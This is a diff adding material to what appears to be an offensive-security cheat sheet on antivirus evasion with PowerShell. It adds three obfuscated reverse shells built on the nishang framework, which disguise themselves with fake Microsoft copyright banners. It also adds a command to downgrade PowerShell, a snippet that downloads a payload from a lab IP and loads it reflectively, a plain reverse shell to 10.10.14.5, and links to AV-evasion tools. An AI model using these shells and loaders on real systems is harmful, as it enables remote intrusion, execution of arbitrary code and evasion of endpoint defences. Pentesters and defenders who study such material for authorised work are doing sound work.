@@ -115,7 +115,6 @@ $F.Close()
 ```
 
 
-
 #### Elevated Required
 
 Turning off Windows Defender
@@ -126,6 +125,116 @@ Get-MpPreference | Select-Object -Property ExclusionPath
 
 #### PowerShell downgrading
 
+```powershell
+powershell -version 2
+```
+
+#### Reverse Shells
+
+```powershell
+Set-Alias -Name K -Value Out-String
+Set-Alias -Name nothingHere -Value iex
+$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"($args[0],$args[1]);
+$replace = $BT.GetStream();
+[byte[]]$B = 0..(32768*2-1)|%{0};
+$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
+$replace.Write($B,0,$B.Length)
+$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
+$replace.Write($B,0,$B.Length)
+[byte[]]$int = 0..(10000+55535)|%{0};
+while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
+$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
+$I = (nothingHere $ROM 2>&1 | K );
+$I2  = $I + (pwd).Path + '> ';
+$U = [text.encoding]::ASCII.GetBytes($I2);
+$replace.Write($U,0,$U.Length);
+$replace.Flush()};
+$BT.Close()
+```
+Credit:
+@TihanyiNorbert (Reverse shell based on the original nishang Framework written by @nikhil_mitt)
+
+```powershell
+$J = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
+$SS = $J.GetStream();
+[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
+$OO = ([text.encoding]::UTF8).GetBytes("Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n")
+$SS.Write($OO,0,$OO.Length)
+$OO = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + '>')
+$SS.Write($OO,0,$OO.Length)
+[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
+while(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);
+$GG = (i`eX $DD 2>&1 | Out-String );
+$H  = $GG + (pwd).Path + '> ';
+$L = ([text.encoding]::UTF8).GetBytes($H);
+$SS.Write($L,0,$L.Length);
+$SS.Flush()};
+$J.Close()
+```
+Credit:
+@TihanyiNorbert (Reverse shell based on the original nishang Framework written by @nikhil_mitt)
+
+```powershell
+$c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
+$I = $c.GetStream();
+[byte[]]$U = 0..(2-shl15)|%{0};
+$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n")
+$I.Write($U,0,$U.Length)
+$U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
+$I.Write($U,0,$U.Length)
+while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
+$a = (iex $D 2>&1 | Out-String );
+$r  = $a + (pwd).Path + '> ';
+$m = ([text.encoding]::ASCII).GetBytes($r);
+$I.Write($m,0,$m.Length);
+$I.Flush()};
+$c.Close()
+```
+Credit: @TihanyiNorbert (Based on the original nishang Framework written by @nikhil_mitt)
+
+## Misc things:
+
+WebClient DownloadData http://x.x.x.x/file.exe method:
+```powershell
+$bytes = (new-object net.webclient).downloaddata("http://10.10.16.74:8080/payload.exe")
+[System.Reflection.Assembly]::Load($bytes)
+$BindingFlags= [Reflection.BindingFlags] "NonPublic,Static"
+$main = [Shell].getmethod("Main", $BindingFlags)
+$main.Invoke($null, $null)
+```
+
+Reverse PowerShell:
+```powershell
+$socket = new-object System.Net.Sockets.TcpClient('10.10.14.5', 4445);
+if($socket -eq $null){exit 1}
+$stream = $socket.GetStream();
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$encoding = new-object System.Text.AsciiEncoding;
+do{
+        $writer.Write("PS> ");
+        $writer.Flush();
+        $read = $null;
+        while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $read);
+        $sendback = (iex $data 2>&1 | Out-String );
+        $sendback2  = $sendback;
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+        $writer.Write($sendbyte,0,$sendbyte.Length);
+}While ($true);
+$writer.close();$socket.close();
+```
+
+
+
+
+
+
+## Tools
+Tools that may help with AV Evasion: 
+- https://github.com/phra/PEzor
+- https://github.com/bats3c/darkarmour
+- https://github.com/loadenmb/tvasion
 
 
 
